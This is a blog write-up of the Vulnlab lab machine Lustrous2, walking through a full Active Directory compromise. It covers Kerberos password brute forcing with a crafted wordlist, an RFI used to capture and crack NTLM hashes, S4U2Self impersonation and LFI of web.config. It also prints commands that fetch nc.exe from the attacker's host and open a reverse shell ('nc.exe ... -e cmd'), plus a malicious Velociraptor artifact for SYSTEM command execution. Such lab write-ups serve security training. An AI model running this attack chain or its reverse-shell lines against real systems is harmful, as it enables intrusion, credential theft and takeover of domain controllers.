---
layout: post
title: VL Lustrous2 (Machine hard)
date: 2024-09-19
categories: [Vulnlab, Machine]
tags: [Vulnlab, Machine, Active Directory, S4U2SELF, Velociraptor, Pass the ccache, RFI]
author: Ethicxz
image: assets/image_start/lustrous2.png
description: VL Machine Lustrous2 by Ethicxz
---

# Before Starting

```console
Me > 10.8.2.163
Target > 10.10.103.182
```
```console
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5357/tcp open  wsdapi
```
## BruteForce Kerberos PREAUTH with a custom wordlist

After going in the ftp with anonymous as user without password we can go in "Home" and retrieve all users to make a "users.txt" we can also find a text file, get him:

![alt text](<../assets/image_lustrous2/1 ftp audit.png>)

Fo for those who have done Lustrous1 you can recognize certain vulnerabilities which are marked as "fixed" which were present in lustrous1, but weak password is marked as "Open"

Since authentication with NTLM is disabled we can try to brute force Kerberos pre-auth

For this we gonna craft a custom wordlist and use kerbrute 

```console
Winter2023
Winter2024
Winter2023!
Winter2023@
Winter2023#
Winter2023&
Winter2023?
Winter2023*
Winter2024!
Winter2024@
Winter2024#
Winter2024&
Winter2024?
Winter2024*
Winter!
Winter@
Winter#
Winter&
Winter?
Winter*
Summer2023
Summer2024
Summer2023!
Summer2023@
Summer2023#
Summer2023&
Summer2023?
Summer2023*
Summer2024!
Summer2024@
Summer2024#
Summer2024&
Summer2024?
Summer2024*
Summer!
Summer@
Summer#
Summer&
Summer?
Summer*
Fall2023
Fall2024
Fall2023!
Fall2023@
Fall2023#
Fall2023&
Fall2023?
Fall2023*
Fall2024!
Fall2024@
Fall2024#
Fall2024&
Fall2024?
Fall2024*
Fall!
Fall@
Fall#
Fall&
Fall?
Fall*
Lustrous2023
Lustrous2024
Lustrous2023!
Lustrous2023@
Lustrous2023#
Lustrous2023&
Lustrous2023?
Lustrous2023*
Lustrous2024!
Lustrous2024@
Lustrous2024#
Lustrous2024&
Lustrous2024?
Lustrous2024*
Lustrous!
Lustrous@
Lustrous#
Lustrous&
Lustrous?
Lustrous*
Spring2023
Spring2024
Spring2023!
Spring2023@
Spring2023#
Spring2023&
Spring2023?
Spring2023*
Spring2024!
Spring2024@
Spring2024#
Spring2024&
Spring2024?
Spring2024*
Spring!
Spring@
Spring#
Spring&
Spring?
Spring*
2023!
2023@
2023#
2023&
2023?
2023*
2024!
2024@
2024#
2024&
2024?
2024*
2022!
2022@
2022#
2022&
2022?
2022*
2021!
2021@
2021#
2021&
2021?
2021*
2018!
2018@
2018#
2018&
2018?
2018*
2019!
2019@
2019#
2019&
2019?
2019*
```
First we need to make a file "creds.txt" with User:Password, like this :

```console
Aaron.Norman:Winter2023
Aaron.Norman:Winter2024
Aaron.Norman:Winter2023!
Aaron.Norman:Winter2023@
Aaron.Norman:Winter2023#
Aaron.Norman:Winter2023&
Aaron.Norman:Winter2023?
Aaron.Norman:Winter2023*
Aaron.Norman:Winter2024!
Aaron.Norman:Winter2024@
```
Do this for all users and all password in the same file

```bash
kerbrute bruteforce -v --domain "lustrous2.vl" --dc 10.10.103.182 creds.txt

2024/09/19 19:26:06 >  [+] VALID LOGIN:Emma.Bell@lustrous2.vl:REDACTED
```
```bash
# Note u need to use the FQDN because we are using kerberos authentication

nxc smb lus2dc.lustrous2.vl -u 'Emma.Bell' -p 'REDACTED' -k
SMB         lus2dc.lustrous2.vl 445    lus2dc           [*]  x64 (name:lus2dc) (domain:lustrous2.vl) (signing:True) (SMBv1:False)
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\Emma.Bell:REDACTED
```
## Get a authentication on the WebApp

Ok now as we saw before, there is a port 80 but trying curl :

```bash
curl 'http://lus2dc.lustrous2.vl/' -v      
*   Trying 10.10.103.182:80...
* Connected to lus2dc.lustrous2.vl (10.10.103.182) port 80 (#0)
> GET / HTTP/1.1
> Host: lus2dc.lustrous2.vl
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Transfer-Encoding: chunked
< Server: Microsoft-IIS/10.0
< WWW-Authenticate: Negotiate
< X-Powered-By: ASP.NET
< Date: Thu, 19 Sep 2024 17:38:07 GMT
< 
* Connection #0 to host lus2dc.lustrous2.vl left intact
```
And if we go in firefox we gonna have a blank site

We need to talk to this webapp with a ccache to get a valid user and be authenticate

So first configure your ```/etc/krb5conf``` like that :

```console
[libdefaults]
        default_realm = LUSTROUS2.VL
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        fcc-mit-ticketflags = true
        dns_canonicalize_hostname = false
        dns_lookup_realm = false
        dns_lookup_kdc = true
        k5login_authoritative = false
[realms]        
        LUSTROUS2.VL = {
                kdc = lustrous2.vl
                admin_server = lustrous2.vl
                default_admin = lustrous2.vl
        }
[domain_realm]
        .lustrous2.vl = LUSTROUS2.VL
```
Now, ask for a TGT and dump the ldap :

```bash
getTGT.py -dc-ip "LUS2DC.Lustrous2.vl" "lustrous2.vl"/'Emma.Bell':'REDACTED' -debug
Impacket v0.12.0.dev1+20240808.192004.154de8a5 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.11/site-packages/impacket
[+] Trying to connect to KDC at LUS2DC.Lustrous2.vl:88
[+] Trying to connect to KDC at LUS2DC.Lustrous2.vl:88
[*] Saving ticket in Emma.Bell.ccache

export KRB5CCNAME=Emma.Bell.ccache                                        

ldeep ldap -k -d "LUS2DC.Lustrous2.vl" -s ldaps://"LUS2DC.Lustrous2.vl" all toto
```
![alt text](<../assets/image_lustrous2/2er see HTTP spn.png>)

So we have a SPN HTTP, we can try to get a service ticket to connect on the site with the ccache :

```bash
getTGT.py -dc-ip "LUS2DC.Lustrous2.vl" "lustrous2.vl"/'Emma.Bell':'REDACTED' -debug

export KRB5CCNAME=Emma.Bell.ccache

getST.py -spn "HTTP/lus2dc.lustrous2.vl" -k -no-pass -dc-ip "10.10.103.182" "lustrous2.vl"/'Emma.Bell'

export KRB5CCNAME=Emma.Bell@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache

curl --negotiate -u : 'http://lus2dc.lustrous2.vl/' -v
```
![alt text](<../assets/image_lustrous2/3er POTENTIAL RFI.png>)

So we are authenticate as Emma.Bell and we can get audit.txt ```/File/Download?fileName=audit.txt```

seeing this url i immediately wanted to test an LFI or RFI :

## RFI

```bash
Responder -I tun0

curl --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Download?fileName=\\10.8.2.163\toto' -v
```

![alt text](<../assets/image_lustrous2/4ER RFI SUCCESS.png>)

Nice, now crack with hashcat :

```bash
hashcat --hash-type 5600 --attack-mode 0 hash.txt /usr/share/wordlists/rockyou.txt
```
Do the same thing (getTGT and getST) with SvcShare creds but nothing more interesting on the site

But if we return on the ldap dump and type this 

```bash 
cat *.json | jq | grep -I -C10 'Admins'
```
We can see that : 

```json
    "dn": "CN=Ryan Davies,OU=lustrous,DC=Lustrous2,DC=vl",
    "givenName": "Ryan",
    "homeDirectory": "\\\\LUS2DC.Lustrous2.vl\\homes$\\Ryan.Davies",
    "homeDrive": "F:",
    "instanceType": 4,
    "lastLogoff": "1601-01-01T00:00:00+00:00",
    "lastLogon": "1601-01-01T00:00:00+00:00",
    "lastLogonTimestamp": "2024-09-07T10:50:05.598505+00:00",
    "logonCount": 0,
    "memberOf": [
      "CN=ShareAdmins,OU=lustrous,DC=Lustrous2,DC=vl",
      "CN=lustrous,CN=Users,DC=Lustrous2,DC=vl"
    ],
    "msDS-SupportedEncryptionTypes": 0,
    "name": "Ryan Davies",
    "objectCategory": "CN=Person,CN=Schema,CN=Configuration,DC=Lustrous2,DC=vl",
    "objectClass": [
      "top",
      "person",
      "organizationalPerson",
      "user"
```
## S4U2SELF

We can try to create HTTP STs for other users using the ShareSvc credentials we have using S4U2SELF :

```bash
getST.py -spn 'HTTP/lus2dc.lustrous2.vl' -dc-ip 'lus2dc.lustrous2.vl' "lustrous2.vl"/"ShareSvc" -hashes :'CA345B5B5E85A8D468FCFBA9F4F8D460' -self -impersonate 'Ryan.Davies' -debug -altservice 'HTTP/lus2dc.lustrous2.vl'

export KRB5CCNAME=Ryan.Davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache

curl --negotiate -u : 'http://lus2dc.lustrous2.vl/' -v 
```
![alt text](<../assets/image_lustrous2/5ER RYAN AUTH.png>)

So we are authenticate as Ryan.Davies and we can access to ```/File/Debug``` and ```/File/Upload```

## LFI to find the PIN and get a shell

Ok but before do a firefox on the url, we need to configure him like that :

```console
# in about:config
network.negotiate-auth.delegation-uris: lus2dc.lustrous2.vl
network.negotiate-auth.trusted-uris: lus2dc.lustrous2.vl
network.negotiate-auth.using-native-gsslib: true
```
Now firefox ```/File/Debug```

![alt text](<../assets/image_lustrous2/DEBUG 6ER.png>)

Ok so we can potentially execute somme command but we need to find a ```PIN```, after trying to bruteforce him but with no success, I thought back to the RFI that I used to get the ShareSvc hash and I used it as an LFI to read files on the target machine

```http://lus2dc.lustrous2.vl/File/Download?fileName=C:/Windows/win.ini``` was working, i tried to leak the ```web.config``` so i did ```http://lus2dc.lustrous2.vl/File/Download?fileName=../../web.config``` and we got the ```web.config```

```console
# WEB.CONFIG FILE
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="cmd.exe" arguments='/c echo IWR http://10.8.2.163:8000/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile' stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 4E46018E-B73C-4E7B-8DA2-87855F22435A-->
```
So as we see there is a DLL, we can try to download it and inspect it with dotPeek to find some creds or the PIN :

![alt text](<../assets/image_lustrous2/7ER PIN DOTPEEK.png>)

Nice ! as we can see there is the ```PIN``` but we can also see that we need to execute command that are less than 100 characters, just download nc.exe and execute him 

```console
curl http://10.8.2.163/nc.exe -o nc.exe

.\nc.exe 10.8.2.163 9001 -e cmd
```
And we got a shell ! 

## Exploiting Velociraptor Software 

After some enumeration that i'm not gonna put in this writeup just for don't waste time, we can find this :

```powershell
PS C:\datastore> ls

Directory: C:\datastore

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          9/6/2024   8:48 AM                acl                                                                  
d-----         9/19/2024   9:48 AM                artifact_definitions                                                 
d-----          9/6/2024   8:35 AM                clients                                                              
d-----          9/6/2024   8:39 AM                client_info                                                          
d-----          9/6/2024   8:34 AM                config                                                               
d-----         9/19/2024   9:51 AM                hunts                                                                
d-----         9/19/2024   9:50 AM                hunt_index                                                           
d-----         9/19/2024   9:07 AM                logs                                                                 
d-----          9/6/2024   8:35 AM                notebooks                                                            
d-----         9/19/2024   9:49 AM                server_artifacts                                                     
d-----          9/6/2024   8:34 AM                server_artifact_logs                                                 
d-----          9/6/2024   8:44 AM                users
```
```powershell
PS C:\Program Files> ls

Directory: C:\Program Files

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          9/7/2024   5:54 AM                Amazon                                                               
d-----         8/31/2024   1:03 AM                Common Files                                                         
d-----          9/6/2024   5:39 AM                dotnet                                                               
d-----          9/6/2024   5:38 AM                IIS                                                                  
d-----         8/31/2024   1:32 AM                Internet Explorer                                                    
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps                                                
d-----          9/6/2024   8:35 AM                Velociraptor                                                         
d-----          9/6/2024   8:34 AM                VelociraptorServer                                                  
d-----          9/7/2024   5:40 AM                VMware                                                               
d-----         8/31/2024   1:55 AM                Windows Defender                                                     
d-----         8/31/2024   1:32 AM                Windows Defender Advanced Threat Protection                          
d-----         8/31/2024   1:32 AM                Windows Mail                                                         
d-----         8/31/2024   1:32 AM                Windows Media Player                                                 
d-----          5/8/2021   2:35 AM                Windows NT                                                           
d-----          3/2/2022   7:58 PM                Windows Photo Viewer                                                 
d-----          5/8/2021   1:34 AM                WindowsPowerShell
```
After some google, ```Velociraptor is an advanced digital forensic and incident response tool that enhances your visibility into your endpoints``` 

I also found this [Write up THM Velociraptor](https://medium.com/@laupeiip/tryhackme-velociraptor-write-up-506b001e9cd8)

So let's see if on the machine there is a 8889 port :

```powershell
netstat -ano

  TCP    127.0.0.1:8001         0.0.0.0:0              LISTENING       2564
  TCP    127.0.0.1:8001         127.0.0.1:49692        ESTABLISHED     2564
  TCP    127.0.0.1:8003         0.0.0.0:0              LISTENING       2564
  TCP    127.0.0.1:8889         0.0.0.0:0              LISTENING       2564
```
Nice let's make a socks to forward this :

```console
chisel server -p 9999 --reverse # on linux
./chisel.exe client 10.8.2.163:9999 R:socks # on windows
```
Now do ```proxychains -q firefox``` and go to ```127.0.0.1:8889```

But the webapp is asking to us some credentials :

If we digging deeper on the target machine we can find this : 

```powershell
PS C:\datastore\acl> ls

Directory: C:\datastore\acl

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          9/6/2024   8:34 AM             27 admin.json.db                                                        
-a----          9/6/2024   8:47 AM             97 operator.json.db                                                     
-a----         9/19/2024   9:07 AM             40 VelociraptorServer.json.db
```
We can see a user operator, using ```operator:operator``` on the webapp we can authenticate :

Here i don't necessarily google anything, i just tried several things trying to understand how work the webapp and i found that if we create a ```Artifact``` then we create a ```Hunter``` and as ```Select Artifact``` we use our custom artifact and put ```Start Hunt Immediately``` as YES

using this malicious artifact if you only want to read the flag :

```console
name: Windows.System.CmdShell222
description: |
  This artifact allows running arbitrary commands through the system
  shell cmd.exe.

  Since Velociraptor typically runs as system, the commands will also
  run as System.

  This is a very powerful artifact since it allows for arbitrary
  command execution on the endpoints. Therefore this artifact requires
  elevated permissions (specifically the `EXECVE`
  permission). Typically it is only available with the `administrator`
  role.

  Note there are some limitations with passing commands to the cmd.exe
  shell, such as when specifying quoted paths or command-line
  arguments with special characters. Using Windows.System.PowerShell
  artifact is likely a better option in these cases.


precondition:
  SELECT OS From info() where OS = 'windows'

parameters:
  - name: Command
    default: "more c:\\users\\administrator\\desktop\\root.txt"

sources:
  - query: |
      SELECT * FROM execve(argv=["cmd.exe", "/c", Command])
```

The output gonna be in the notebook of the hunter

But if we want shell just do this :

```console
name: Windows.System.CmdShell222
description: |
  This artifact allows running arbitrary commands through the system
  shell cmd.exe.

  Since Velociraptor typically runs as system, the commands will also
  run as System.

  This is a very powerful artifact since it allows for arbitrary
  command execution on the endpoints. Therefore this artifact requires
  elevated permissions (specifically the `EXECVE`
  permission). Typically it is only available with the `administrator`
  role.

  Note there are some limitations with passing commands to the cmd.exe
  shell, such as when specifying quoted paths or command-line
  arguments with special characters. Using Windows.System.PowerShell
  artifact is likely a better option in these cases.


precondition:
  SELECT OS From info() where OS = 'windows'

parameters:
  - name: Command
    default: "trigger your nc.exe uploaded before"

sources:
  - query: |
      SELECT * FROM execve(argv=["cmd.exe", "/c", Command])
```
Nice ! sorry if my english was bad and if you have any questions or comments on this write up you can dm me on [instagram](https://instagram.com/eliott.la) or on discord : 'ethicxz.'

